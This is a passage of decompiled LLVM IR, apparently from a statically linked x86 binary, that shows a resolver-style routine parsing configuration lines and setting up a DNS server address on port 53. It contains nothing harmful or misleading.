  store i32 %v3_8067706, i32* %eax.global-to-local, align 4
  %tmp33 = icmp slt i32 %v3_8067706, 1
  br i1 %tmp33, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_8067716

dec_label_pc_8067716:                             ; preds = %dec_label_pc_80676fa
  %v0_806770b = load i32, i32* @esp, align 4
  %v1_8067716 = add i32 %v0_806770b, 512
  %v2_8067716 = inttoptr i32 %v1_8067716 to i16*
  store i16 2, i16* %v2_8067716, align 2
  br label %dec_label_pc_8067720

dec_label_pc_8067720:                             ; preds = %dec_label_pc_80676ee, %dec_label_pc_8067716
  %v0_8067720 = load i64, i64* @global_var_8078c84.1719, align 8
  %v1_8067720 = trunc i64 %v0_8067720 to i32
  store i32 %v1_8067720, i32* %eax.global-to-local, align 4
  %v0_8067725 = load i32, i32* @esp, align 4
  %v1_8067725 = add i32 %v0_8067725, 498
  %v2_8067725 = inttoptr i32 %v1_8067725 to i16*
  store i16 13568, i16* %v2_8067725, align 2
  %v0_806772f = load i32, i32* @ecx, align 4
  %v1_806772f = load i32, i32* @esp, align 4
  %v2_806772f = add i32 %v1_806772f, -4
  %v3_806772f = inttoptr i32 %v2_806772f to i32*
  store i32 %v0_806772f, i32* %v3_806772f, align 4
  %v0_8067730 = load i32, i32* @ecx, align 4
  %v2_8067730 = add i32 %v1_806772f, -8
  %v3_8067730 = inttoptr i32 %v2_8067730 to i32*
  store i32 %v0_8067730, i32* %v3_8067730, align 4
  %v0_8067731 = load i32, i32* %eax.global-to-local, align 4
  %tmp34 = mul i32 %v0_8067731, 28
  %v3_8067732 = add i32 %tmp34, 28
  store i32 %v3_8067732, i32* %eax.global-to-local, align 4
  %v2_8067735 = add i32 %v1_806772f, -12
  %v3_8067735 = inttoptr i32 %v2_8067735 to i32*
  store i32 %v3_8067732, i32* %v3_8067735, align 4
  %v0_8067736 = load i32, i32* @global_var_8078c80.1720, align 128
  %v2_8067736 = add i32 %v1_806772f, -16
  %v3_8067736 = inttoptr i32 %v2_8067736 to i32*
  store i32 %v0_8067736, i32* %v3_8067736, align 4
  %v0_806773c = call i32 @realloc()
  store i32 %v0_806773c, i32* %eax.global-to-local, align 4
  %v0_8067741 = load i32, i32* @esp, align 4
  %v1_8067744 = icmp eq i32 %v0_806773c, 0
  br i1 %v1_8067744, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_806774e

dec_label_pc_806774e:                             ; preds = %dec_label_pc_8067720
  %v0_806774e = load i64, i64* @global_var_8078c84.1719, align 8
  %v1_806774e = trunc i64 %v0_806774e to i32
  store i32 %v0_806773c, i32* @global_var_8078c80.1720, align 128
  %v3_8067759 = mul i32 %v1_806774e, 28
  %v1_806775c = add i32 %v1_806774e, 1
  store i32 %v1_806775c, i32* %ebx.global-to-local, align 4
  %v2_806775d = add i32 %v3_8067759, %v0_806773c
  store i32 %v2_806775d, i32* %eax.global-to-local, align 4
  %v2_806775f = add i32 %v0_8067741, 12
  %v3_806775f = inttoptr i32 %v2_806775f to i32*
  store i32 %v0_806773c, i32* %v3_806775f, align 4
  %v1_8067760 = add i32 %v0_8067741, 8
  %v2_8067760 = inttoptr i32 %v1_8067760 to i32*
  store i32 28, i32* %v2_8067760, align 4
  %v1_8067762 = add i32 %v0_8067741, 512
  %v2_8067769 = add i32 %v0_8067741, 4
  %v3_8067769 = inttoptr i32 %v2_8067769 to i32*
  store i32 %v1_8067762, i32* %v3_8067769, align 4
  %v0_806776a = load i32, i32* %eax.global-to-local, align 4
  %v3_806776a = inttoptr i32 %v0_8067741 to i32*
  store i32 %v0_806776a, i32* %v3_806776a, align 4
  %v4_806776b = call i32 @memcpy(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_806776b, i32* %eax.global-to-local, align 4
  %v0_8067773 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067773 = sext i32 %v0_8067773 to i64
  store i64 %v1_8067773, i64* @global_var_8078c84.1719, align 8
  br label %dec_label_pc_80678ba.backedge

dec_label_pc_80678ba.backedge:                    ; preds = %dec_label_pc_806781b, %dec_label_pc_8067800, %dec_label_pc_80677d0, %dec_label_pc_806774e, %dec_label_pc_806789c, %dec_label_pc_80676fa, %dec_label_pc_8067720, %dec_label_pc_806783c, %dec_label_pc_8067850, %dec_label_pc_8067854, %dec_label_pc_8067883
  %.0.be = phi i8* [ %.0, %dec_label_pc_806783c ], [ %.0, %dec_label_pc_8067850 ], [ %.0, %dec_label_pc_8067854 ], [ %.0, %dec_label_pc_806789c ], [ %.0, %dec_label_pc_8067883 ], [ %v4_80676d0, %dec_label_pc_80676fa ], [ %v4_80676d0, %dec_label_pc_8067720 ], [ %v4_80676d0, %dec_label_pc_806774e ], [ %.0, %dec_label_pc_80677d0 ], [ %.0, %dec_label_pc_8067800 ], [ %.0, %dec_label_pc_806781b ]
  %v1_80678ba.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80678ba

dec_label_pc_806777e:                             ; preds = %dec_label_pc_806768b
  %v2_806777e = add i32 %v0_80676b2, 12
  %v3_806777e = inttoptr i32 %v2_806777e to i32*
  store i32 %v3_80676ad, i32* %v3_806777e, align 4
  %v2_806777f = add i32 %v0_80676b2, 8
  %v3_806777f = inttoptr i32 %v2_806777f to i32*
  store i32 %v3_80676ad, i32* %v3_806777f, align 4
  %v1_8067780 = add i32 %v0_80676b2, 4
  %v2_8067780 = inttoptr i32 %v1_8067780 to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_80703fc.1726 to i32), i32* %v2_8067780, align 4
  %v0_8067785 = load i32, i32* @esi, align 4
  %v3_8067785 = inttoptr i32 %v0_80676b2 to i32*
  store i32 %v0_8067785, i32* %v3_8067785, align 4
  %v3_8067786 = call i32 @__GI_strcoll(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8067786, i32* @eax, align 4
  %v0_806778b = load i32, i32* @esp, align 4
  %v1_806778e = icmp eq i32 %v3_8067786, 0
  br i1 %v1_806778e, label %dec_label_pc_80677c7.preheader, label %dec_label_pc_8067792

dec_label_pc_8067792:                             ; preds = %dec_label_pc_806777e
  %v2_8067792 = add i32 %v0_806778b, 12
  %v3_8067792 = inttoptr i32 %v2_8067792 to i32*
  store i32 %v3_8067786, i32* %v3_8067792, align 4
  %v2_8067793 = add i32 %v0_806778b, 8
  %v3_8067793 = inttoptr i32 %v2_8067793 to i32*
  store i32 %v3_8067786, i32* %v3_8067793, align 4
  %v1_8067794 = add i32 %v0_806778b, 4
  %v2_8067794 = inttoptr i32 %v1_8067794 to i32*
  store i32 ptrtoint ([7 x i8]* @global_var_8070403.1727 to i32), i32* %v2_8067794, align 4
  %v0_8067799 = load i32, i32* @esi, align 4
  %v3_8067799 = inttoptr i32 %v0_806778b to i32*
  store i32 %v0_8067799, i32* %v3_8067799, align 4
  %v3_806779a = call i32 @__GI_strcoll(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_806779a, i32* @eax, align 4
  %v0_806779f = load i32, i32* @esp, align 4
  %v1_80677a2 = icmp eq i32 %v3_806779a, 0
  br i1 %v1_80677a2, label %dec_label_pc_80677c7.preheader, label %dec_label_pc_806783c

dec_label_pc_80677c7.preheader:                   ; preds = %dec_label_pc_806777e, %dec_label_pc_8067792
  %v0_80677b316.in = phi i32 [ %v0_806778b, %dec_label_pc_806777e ], [ %v0_806779f, %dec_label_pc_8067792 ]
  %v0_80677c73 = load i32, i32* @global_var_8078c88.1715, align 8
  store i32 %v0_80677c73, i32* %eax.global-to-local, align 4
  %v1_80677cc4 = icmp eq i32 %v0_80677c73, 0
  %v1_80677ce11 = icmp eq i1 %v1_80677cc4, false
  br i1 %v1_80677ce11, label %dec_label_pc_80677ab, label %dec_label_pc_80677d0

dec_label_pc_80677ab:                             ; preds = %dec_label_pc_80677c7.preheader, %dec_label_pc_80677ab
  %v0_80677b3.in = phi i32 [ %v0_80677c4, %dec_label_pc_80677ab ], [ %v0_80677b316.in, %dec_label_pc_80677c7.preheader ]
  %v0_80677c712 = phi i32 [ %v0_80677c7, %dec_label_pc_80677ab ], [ %v0_80677c73, %dec_label_pc_80677c7.preheader ]
  %v1_80677ab = add i32 %v0_80677c712, -1
  %v0_80677ae = load i32, i32* @global_var_8078c7c.1716, align 4
  store i32 %v0_80677ae, i32* %eax.global-to-local, align 4
  store i32 %v1_80677ab, i32* @global_var_8078c88.1715, align 8
  %v2_80677bc = mul i32 %v1_80677ab, 4
  %v3_80677bc = add i32 %v0_80677ae, %v2_80677bc
  %v4_80677bc = inttoptr i32 %v3_80677bc to i32*
  %v5_80677bc = load i32, i32* %v4_80677bc, align 4
  %v8_80677bc = inttoptr i32 %v0_80677b3.in to i32*
  store i32 %v5_80677bc, i32* %v8_80677bc, align 4
  %v1_80677bf = call i32 @free(i32 %v3_8067672)
  %v0_80677c4 = load i32, i32* @esp, align 4
  %v0_80677c7 = load i32, i32* @global_var_8078c88.1715, align 8
  store i32 %v0_80677c7, i32* %eax.global-to-local, align 4
  %v1_80677cc = icmp eq i32 %v0_80677c7, 0
  %v1_80677ce = icmp eq i1 %v1_80677cc, false
  br i1 %v1_80677ce, label %dec_label_pc_80677ab, label %dec_label_pc_80677d0

dec_label_pc_80677d0:                             ; preds = %dec_label_pc_80677c7.preheader, %dec_label_pc_80677ab, %dec_label_pc_806781b
  %v0_80677d0 = load i32, i32* @ebp, align 4
  store i32 %v0_80677d0, i32* @eax, align 4
  %v0_80677d2 = call i32 @skip_nospace()
  store i32 %v0_80677d2, i32* @eax, align 4
  %v0_80677d7 = call i32 @skip_and_NUL_space()
  store i32 %v0_80677d7, i32* @ebx, align 4
  %v2_80677de = load i32, i32* @esp, align 4
  %v3_80677de = add i32 %v2_80677de, -4
  %v4_80677de = inttoptr i32 %v3_80677de to i32*
  store i32 %v0_80677d7, i32* %v4_80677de, align 4
  %v3_80677df = add i32 %v2_80677de, -8
  %v4_80677df = inttoptr i32 %v3_80677df to i32*
  store i32 %v0_80677d7, i32* %v4_80677df, align 4
  %v0_80677e0 = load i32, i32* @global_var_8078c88.1715, align 8
  %tmp35 = mul i32 %v0_80677e0, 4
  %v2_80677e6 = add i32 %tmp35, 4
  store i32 %v2_80677e6, i32* %eax.global-to-local, align 4
  %v2_80677e9 = add i32 %v2_80677de, -12
  %v3_80677e9 = inttoptr i32 %v2_80677e9 to i32*
  store i32 %v2_80677e6, i32* %v3_80677e9, align 4
  %v0_80677ea = load i32, i32* @global_var_8078c7c.1716, align 4
  %v2_80677ea = add i32 %v2_80677de, -16
  %v3_80677ea = inttoptr i32 %v2_80677ea to i32*
  store i32 %v0_80677ea, i32* %v3_80677ea, align 4
  %v0_80677f0 = call i32 @realloc()
  store i32 %v0_80677f0, i32* %eax.global-to-local, align 4
  %v1_80677f8 = icmp eq i32 %v0_80677f0, 0
  br i1 %v1_80677f8, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_8067800

dec_label_pc_8067800:                             ; preds = %dec_label_pc_80677d0
  %v0_80677f5 = load i32, i32* @esp, align 4
  %v0_8067803 = load i32, i32* @ebp, align 4
  %v3_8067803 = inttoptr i32 %v0_80677f5 to i32*
  store i32 %v0_8067803, i32* %v3_8067803, align 4
  store i32 %v0_80677f0, i32* @global_var_8078c7c.1716, align 4
  %v0_8067809 = call i32 @__GI_strdup()
  store i32 %v0_8067809, i32* %eax.global-to-local, align 4
  %v1_8067811 = icmp eq i32 %v0_8067809, 0
  store i32 %v0_8067809, i32* @ecx, align 4
  br i1 %v1_8067811, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_806781b

dec_label_pc_806781b:                             ; preds = %dec_label_pc_8067800
  %v0_806781b = load i32, i32* @global_var_8078c88.1715, align 8
  store i32 %v0_806781b, i32* %eax.global-to-local, align 4
  %v0_8067820 = load i32, i32* @ebx, align 4
  store i32 %v0_8067820, i32* @ebp, align 4
  %v0_8067822 = load i32, i32* @global_var_8078c7c.1716, align 4
  %v3_8067828 = mul i32 %v0_806781b, 4
  %v4_8067828 = add i32 %v0_8067822, %v3_8067828
  %v5_8067828 = inttoptr i32 %v4_8067828 to i32*
  store i32 %v0_8067809, i32* %v5_8067828, align 4
  %v0_806782b = load i32, i32* %eax.global-to-local, align 4
  %v1_806782b = add i32 %v0_806782b, 1
  store i32 %v1_806782b, i32* %eax.global-to-local, align 4
  store i32 %v1_806782b, i32* @global_var_8078c88.1715, align 8
  %v0_8067831 = load i32, i32* @ebx, align 4
  %v1_8067831 = inttoptr i32 %v0_8067831 to i8*
  %v2_8067831 = load i8, i8* %v1_8067831, align 1
  %v3_8067831 = icmp eq i8 %v2_8067831, 0
  br i1 %v3_8067831, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_80677d0

dec_label_pc_806783c:                             ; preds = %dec_label_pc_8067792
  %v2_806783c = add i32 %v0_806779f, 12
  %v3_806783c = inttoptr i32 %v2_806783c to i32*
  store i32 %v3_806779a, i32* %v3_806783c, align 4
  %v2_806783d = add i32 %v0_806779f, 8
  %v3_806783d = inttoptr i32 %v2_806783d to i32*
  store i32 %v3_806779a, i32* %v3_806783d, align 4
  %v1_806783e = add i32 %v0_806779f, 4
  %v2_806783e = inttoptr i32 %v1_806783e to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_807040a.1728 to i32), i32* %v2_806783e, align 4
  %v0_8067843 = load i32, i32* @esi, align 4
  %v3_8067843 = inttoptr i32 %v0_806779f to i32*
  store i32 %v0_8067843, i32* %v3_8067843, align 4
  %v3_8067844 = call i32 @__GI_strcoll(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8067844, i32* %eax.global-to-local, align 4
  %v0_8067849 = load i32, i32* @esp, align 4
  %v1_806784c = icmp eq i32 %v3_8067844, 0
  %v1_806784e = icmp eq i1 %v1_806784c, false
  br i1 %v1_806784e, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_8067850

dec_label_pc_8067850:                             ; preds = %dec_label_pc_806783c
  %v0_8067850 = load i32, i32* @ebp, align 4
  %v1_8067850 = icmp eq i32 %v0_8067850, 0
  br i1 %v1_8067850, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_8067854

dec_label_pc_8067854:                             ; preds = %dec_label_pc_8067850
  %v2_8067854 = add i32 %v0_8067849, 12
  %v3_8067854 = inttoptr i32 %v2_8067854 to i32*
  store i32 %v3_8067844, i32* %v3_8067854, align 4
  %v2_8067855 = add i32 %v0_8067849, 8
  %v3_8067855 = inttoptr i32 %v2_8067855 to i32*
  store i32 %v3_8067844, i32* %v3_8067855, align 4
  %v1_8067856 = add i32 %v0_8067849, 4
  %v2_8067856 = inttoptr i32 %v1_8067856 to i32*
  store i32 58, i32* %v2_8067856, align 4
  %v0_8067858 = load i32, i32* @ebp, align 4
  %v3_8067858 = inttoptr i32 %v0_8067849 to i32*
  store i32 %v0_8067858, i32* %v3_8067858, align 4
  %v3_8067859 = call i32 @__GI_strchr(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8067859, i32* @eax, align 4
  %v2_8067861 = icmp eq i32 %v3_8067859, 0
  store i32 %v3_8067859, i32* @ebx, align 4
  br i1 %v2_8067861, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_8067867

dec_label_pc_8067867:                             ; preds = %dec_label_pc_8067854
  %v4_8067859 = inttoptr i32 %v3_8067859 to i8*
  store i8 0, i8* %v4_8067859, align 1
  store i32 ptrtoint (i64* @global_var_8071b08.1721 to i32), i32* @esi, align 4
  %v2_806786f = load i32, i32* @esp, align 4
  %v3_806786f = add i32 %v2_806786f, -4
  %v4_806786f = inttoptr i32 %v3_806786f to i32*
  store i32 %v1_80676a3, i32* %v4_806786f, align 4
  %v3_8067870 = add i32 %v2_806786f, -8
  %v4_8067870 = inttoptr i32 %v3_8067870 to i32*
  store i32 %v1_80676a3, i32* %v4_8067870, align 4
  %v1_8067871 = add i32 %v2_806786f, -12
  %v2_8067871 = inttoptr i32 %v1_8067871 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_8070412.1729 to i32), i32* %v2_8067871, align 4
  %v0_8067876 = load i32, i32* @ebp, align 4
  %v2_8067876 = add i32 %v2_806786f, -16
  %v3_8067876 = inttoptr i32 %v2_8067876 to i32*
  store i32 %v0_8067876, i32* %v3_8067876, align 4
  %v3_8067877 = call i32 @__GI_strcoll(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8067877, i32* @eax, align 4
  %v0_806787c = load i32, i32* @esp, align 4
  %v1_806787f = icmp eq i32 %v3_8067877, 0
  br i1 %v1_806787f, label %dec_label_pc_806789c, label %dec_label_pc_8067883

dec_label_pc_8067883:                             ; preds = %dec_label_pc_8067867
  %v0_8067883 = load i32, i32* @esi, align 4
  %v2_8067883 = add i32 %v0_806787c, 12
  %v3_8067883 = inttoptr i32 %v2_8067883 to i32*
  store i32 %v0_8067883, i32* %v3_8067883, align 4
  %v0_8067884 = load i32, i32* @esi, align 4
  %v2_8067884 = add i32 %v0_806787c, 8
  %v3_8067884 = inttoptr i32 %v2_8067884 to i32*
  store i32 %v0_8067884, i32* %v3_8067884, align 4
  %v1_8067885 = add i32 %v0_806787c, 4
  %v2_8067885 = inttoptr i32 %v1_8067885 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_807041a.1730 to i32), i32* %v2_8067885, align 4
  %v0_806788a = load i32, i32* @ebp, align 4
  %v3_806788a = inttoptr i32 %v0_806787c to i32*
  store i32 %v0_806788a, i32* %v3_806788a, align 4
  %v3_806788b = call i32 @__GI_strcoll(i8* %v2_80676ad, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_806788b, i32* %eax.global-to-local, align 4
  %v1_8067893 = icmp eq i32 %v3_806788b, 0
  %v1_8067895 = icmp eq i1 %v1_8067893, false
  br i1 %v1_8067895, label %dec_label_pc_80678ba.backedge, label %dec_label_pc_8067897

dec_label_pc_8067897:                             ; preds = %dec_label_pc_8067883
  %v0_8067890 = load i32, i32* @esp, align 4
  store i32 ptrtoint (i8** @global_var_8071b09 to i32), i32* @esi, align 4
  br label %dec_label_pc_806789c

dec_label_pc_806789c:                             ; preds = %dec_label_pc_8067867, %dec_label_pc_8067897
  %v0_806789c.in = phi i32 [ %v0_806787c, %dec_label_pc_8067867 ], [ %v0_8067890, %dec_label_pc_8067897 ]
  %v0_806789f = load i32, i32* @ebx, align 4
  %v1_806789f = add i32 %v0_806789f, 1
  store i32 %v1_806789f, i32* %eax.global-to-local, align 4
  %v3_80678a2 = inttoptr i32 %v0_806789c.in to i32*
  store i32 %v1_806789f, i32* %v3_80678a2, align 4
  %v1_80678a3 = call i32 @atol(i32 %v3_8067672)
  %v2_80678a3 = trunc i32 %v1_80678a3 to i8
  store i32 %v1_80678a3, i32* %eax.global-to-local, align 4
  %v3_80678ab = load i32, i32* @esi, align 4
  %v4_80678ab = inttoptr i32 %v3_80678ab to i8*
  store i8 %v2_80678a3, i8* %v4_80678ab, align 1
  br label %dec_label_pc_80678ba.backedge

dec_label_pc_80678af:                             ; preds = %dec_label_pc_8067658
  %v2_80678af = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_80678af, i32* %eax.global-to-local, align 4
  %v2_80676ad = inttoptr i32 %v3_8067672 to i8*
  br label %dec_label_pc_80678ba

dec_label_pc_80678ba:                             ; preds = %dec_label_pc_80678ba.backedge, %dec_label_pc_80678af
  %v1_80678ba = phi i32 [ %v15_80675ff, %dec_label_pc_80678af ], [ %v1_80678ba.pre, %dec_label_pc_80678ba.backedge ]
  %.0 = phi i8* [ undef, %dec_label_pc_80678af ], [ %.0.be, %dec_label_pc_80678ba.backedge ]
  %v0_80678ba = load i32, i32* @ecx, align 4
  %v2_80678ba = add i32 %v1_80678ba, -4
  %v3_80678ba = inttoptr i32 %v2_80678ba to i32*
  store i32 %v0_80678ba, i32* %v3_80678ba, align 4
  %v1_80678bb = add i32 %v1_80678ba, 8
  %v2_80678bb = inttoptr i32 %v1_80678bb to i32*
  %v3_80678bb = load i32, i32* %v2_80678bb, align 4
  %v5_80678bb = add i32 %v1_80678ba, -8
  %v6_80678bb = inttoptr i32 %v5_80678bb to i32*
  store i32 %v3_80678bb, i32* %v6_80678bb, align 4
  %v1_80678bf = add i32 %v1_80678ba, -12
  %v2_80678bf = inttoptr i32 %v1_80678bf to i32*
  store i32 128, i32* %v2_80678bf, align 4
  %v1_80678c4 = add i32 %v1_80678ba, 280
  %v2_80678cb = add i32 %v1_80678ba, -16
  %v3_80678cb = inttoptr i32 %v2_80678cb to i32*
  store i32 %v1_80678c4, i32* %v3_80678cb, align 4
  %v0_80678cc = call i32 @fgets()
  store i32 %v0_80678cc, i32* %eax.global-to-local, align 4
  %v0_80678d1 = load i32, i32* @esp, align 4
  %v1_80678d4 = icmp eq i32 %v0_80678cc, 0
  %v1_80678d6 = icmp eq i1 %v1_80678d4, false
  br i1 %v1_80678d6, label %dec_label_pc_806768b, label %dec_label_pc_80678dc

dec_label_pc_80678dc:                             ; preds = %dec_label_pc_80678ba
  %v1_80678df = add i32 %v0_80678d1, 24
  %v2_80678df = inttoptr i32 %v1_80678df to i32*
  %v3_80678df = load i32, i32* %v2_80678df, align 4
  %v6_80678df = inttoptr i32 %v0_80678d1 to i32*
  store i32 %v3_80678df, i32* %v6_80678df, align 4
  %v1_80678e3 = call i32 @__GI_fclose(i32 %v2_80678af)
  store i32 %v1_80678e3, i32* %eax.global-to-local, align 4
  %v0_80678e8 = load i32, i32* @esp, align 4
  %v1_80678e8 = add i32 %v0_80678e8, 16
  br label %dec_label_pc_80678eb

dec_label_pc_80678eb:                             ; preds = %dec_label_pc_8067658, %dec_label_pc_80678dc
  %v0_80678f4 = phi i32 [ %v1_80678e8, %dec_label_pc_80678dc ], [ %v15_80675ff, %dec_label_pc_8067658 ]
  %stack_var_-536.0 = phi i32 [ %v2_80678af, %dec_label_pc_80678dc ], [ %tmp, %dec_label_pc_8067658 ]
  %v0_80678eb = load i64, i64* @global_var_8078c84.1719, align 8
  %v1_80678eb = trunc i64 %v0_80678eb to i32
  %v2_80678eb = icmp eq i32 %v1_80678eb, 0
  %v1_80678f2 = icmp eq i1 %v2_80678eb, false
  br i1 %v1_80678f2, label %dec_label_pc_8067927, label %dec_label_pc_80678f4

dec_label_pc_80678f4:                             ; preds = %dec_label_pc_80678eb
  %v1_80678f7 = add i32 %v0_80678f4, -16
  %v2_80678f7 = inttoptr i32 %v1_80678f7 to i32*
  store i32 28, i32* %v2_80678f7, align 4
  %v1_80678f9 = call i32 @malloc(i32 %stack_var_-536.0)
  store i32 %v1_80678f9, i32* %eax.global-to-local, align 4
  %v1_8067901 = icmp eq i32 %v1_80678f9, 0
  store i32 %v1_80678f9, i32* @edi, align 4
  store i32 %v1_80678f9, i32* @global_var_8078c80.1720, align 128
  br i1 %v1_8067901, label %dec_label_pc_8067917, label %dec_label_pc_806790c

dec_label_pc_806790c:                             ; preds = %dec_label_pc_80678f4
  store i32 ptrtoint (i32* @global_var_8070424.1731 to i32), i32* %esi.global-to-local, align 4
  %v4_8067911 = inttoptr i32 %v1_80678f9 to i32*
  store i32 889192450, i32* %v4_8067911, align 4
  %v5_8067911 = load i32, i32* @edi, align 4
  %v6_8067911 = load i32, i32* %esi.global-to-local, align 4
  %v7_8067911 = load i1, i1* @df, align 1
  %v8_8067911 = select i1 %v7_8067911, i32 -4, i32 4
  %v9_8067911 = add i32 %v8_8067911, %v5_8067911
  %v10_8067911 = add i32 %v8_8067911, %v6_8067911
  store i32 %v9_8067911, i32* %edi.global-to-local, align 4
  store i32 %v10_8067911, i32* %esi.global-to-local, align 4
  %v1_8067912 = inttoptr i32 %v10_8067911 to i32*
  %v2_8067912 = load i32, i32* %v1_8067912, align 4
  %v4_8067912 = inttoptr i32 %v9_8067911 to i32*
  store i32 %v2_8067912, i32* %v4_8067912, align 4
  %v5_8067912 = load i32, i32* %edi.global-to-local, align 4
  %v6_8067912 = load i32, i32* %esi.global-to-local, align 4
  %v9_8067912 = add i32 %v5_8067912, %v8_8067911
  %v10_8067912 = add i32 %v6_8067912, %v8_8067911
  store i32 %v9_8067912, i32* %edi.global-to-local, align 4
  store i32 %v10_8067912, i32* %esi.global-to-local, align 4
  %v1_8067913 = inttoptr i32 %v10_8067912 to i32*
  %v2_8067913 = load i32, i32* %v1_8067913, align 4
  %v4_8067913 = inttoptr i32 %v9_8067912 to i32*
  store i32 %v2_8067913, i32* %v4_8067913, align 4
  %v5_8067913 = load i32, i32* %edi.global-to-local, align 4
  %v6_8067913 = load i32, i32* %esi.global-to-local, align 4
  %v9_8067913 = add i32 %v5_8067913, %v8_8067911
  %v10_8067913 = add i32 %v6_8067913, %v8_8067911
  store i32 %v9_8067913, i32* %edi.global-to-local, align 4
  store i32 %v10_8067913, i32* %esi.global-to-local, align 4
  %v1_8067914 = inttoptr i32 %v10_8067913 to i32*
  %v2_8067914 = load i32, i32* %v1_8067914, align 4
  %v4_8067914 = inttoptr i32 %v9_8067913 to i32*
  store i32 %v2_8067914, i32* %v4_8067914, align 4
  %v5_8067914 = load i32, i32* %edi.global-to-local, align 4
  %v9_8067914 = add i32 %v5_8067914, %v8_8067911
  store i32 %v9_8067914, i32* @edi, align 4
  br label %dec_label_pc_8067921

dec_label_pc_8067917:                             ; preds = %dec_label_pc_80678f4
  store i32 ptrtoint (i32* @global_var_8070424.1731 to i32), i32* @global_var_8078c80.1720, align 128
  br label %dec_label_pc_8067921

dec_label_pc_8067921:                             ; preds = %dec_label_pc_806790c, %dec_label_pc_8067917
  %v0_8067921 = load i64, i64* @global_var_8078c84.1719, align 8
  %v1_8067921 = trunc i64 %v0_8067921 to i32
  %v2_8067921 = add i32 %v1_8067921, 1
  %v15_8067921 = sext i32 %v2_8067921 to i64
  store i64 %v15_8067921, i64* @global_var_8078c84.1719, align 8
  br label %dec_label_pc_8067927

dec_label_pc_8067927:                             ; preds = %dec_label_pc_80678eb, %dec_label_pc_8067921
  %v0_8067927 = load i32, i32* @global_var_8078c88.1715, align 8
  %v1_8067927 = icmp eq i32 %v0_8067927, 0
  %v1_806792e = icmp eq i1 %v1_8067927, false
  br i1 %v1_806792e, label %dec_label_pc_80679a8, label %dec_label_pc_8067930

dec_label_pc_8067930:                             ; preds = %dec_label_pc_8067927
  %v0_8067930 = load i32, i32* @edx, align 4
  %v1_8067930 = load i32, i32* @esp, align 4
  %v2_8067930 = add i32 %v1_8067930, -4
  %v3_8067930 = inttoptr i32 %v2_8067930 to i32*
  store i32 %v0_8067930, i32* %v3_8067930, align 4
  %v0_8067931 = load i32, i32* @edx, align 4
  %v2_8067931 = add i32 %v1_8067930, -8
  %v3_8067931 = inttoptr i32 %v2_8067931 to i32*
  store i32 %v0_8067931, i32* %v3_8067931, align 4
  %v1_8067932 = add i32 %v1_8067930, -12
  %v2_8067932 = inttoptr i32 %v1_8067932 to i32*
  store i32 255, i32* %v2_8067932, align 4
  %v1_8067937 = add i32 %v1_8067930, 24
  store i32 %v1_8067937, i32* @ebx, align 4
  %v2_806793b = add i32 %v1_8067930, -16
  %v3_806793b = inttoptr i32 %v2_806793b to i32*
  store i32 %v1_8067937, i32* %v3_806793b, align 4
  %v0_806793c = call i32 @__GI_gethostname()
  store i32 %v0_806793c, i32* %eax.global-to-local, align 4
  %v0_8067941 = load i32, i32* @esp, align 4
  %v1_8067941 = add i32 %v0_8067941, 295
  %v2_8067941 = inttoptr i32 %v1_8067941 to i8*
  store i8 0, i8* %v2_8067941, align 1
  %v0_8067949 = load i32, i32* @esp, align 4
  %v1_806794c = icmp eq i32 %v0_806793c, 0
  %v1_806794e = icmp eq i1 %v1_806794c, false
  br i1 %v1_806794e, label %dec_label_pc_80679a8, label %dec_label_pc_8067950

dec_label_pc_8067950:                             ; preds = %dec_label_pc_8067930
  %v2_8067950 = add i32 %v0_8067949, 12
  %v3_8067950 = inttoptr i32 %v2_8067950 to i32*
  store i32 %v0_806793c, i32* %v3_8067950, align 4
  %v2_8067951 = add i32 %v0_8067949, 8
  %v3_8067951 = inttoptr i32 %v2_8067951 to i32*
  store i32 %v0_806793c, i32* %v3_8067951, align 4
  %v1_8067952 = add i32 %v0_8067949, 4
  %v2_8067952 = inttoptr i32 %v1_8067952 to i32*
  store i32 46, i32* %v2_8067952, align 4
  %v0_8067954 = load i32, i32* @ebx, align 4
  %v3_8067954 = inttoptr i32 %v0_8067949 to i32*
  store i32 %v0_8067954, i32* %v3_8067954, align 4
  %v2_8067955 = inttoptr i32 %stack_var_-536.0 to i8*
  %v3_8067955 = call i32 @__GI_strchr(i8* %v2_8067955, i32 %v3_8067672)
  store i32 %v3_8067955, i32* %eax.global-to-local, align 4
  %v0_806795a = load i32, i32* @esp, align 4
  %v1_806795d = icmp eq i32 %v3_8067955, 0
  br i1 %v1_806795d, label %dec_label_pc_80679a8, label %dec_label_pc_8067961

dec_label_pc_8067961:                             ; preds = %dec_label_pc_8067950
  %v1_8067961 = add i32 %v3_8067955, 1
  %v2_8067961 = inttoptr i32 %v1_8067961 to i8*
  %v3_8067961 = load i8, i8* %v2_8067961, align 1
  %v4_8067961 = icmp eq i8 %v3_8067961, 0
  br i1 %v4_8067961, label %dec_label_pc_80679a8, label %dec_label_pc_806796a

dec_label_pc_806796a:                             ; preds = %dec_label_pc_8067961
  %v3_806796d = inttoptr i32 %v0_806795a to i32*
  store i32 %v1_8067961, i32* %v3_806796d, align 4
  %v0_806796e = call i32 @__GI_strdup()
  store i32 %v0_806796e, i32* %eax.global-to-local, align 4
  %v0_8067973 = load i32, i32* @esp, align 4
  %v1_8067976 = icmp eq i32 %v0_806796e, 0
  store i32 %v0_806796e, i32* @ebx, align 4
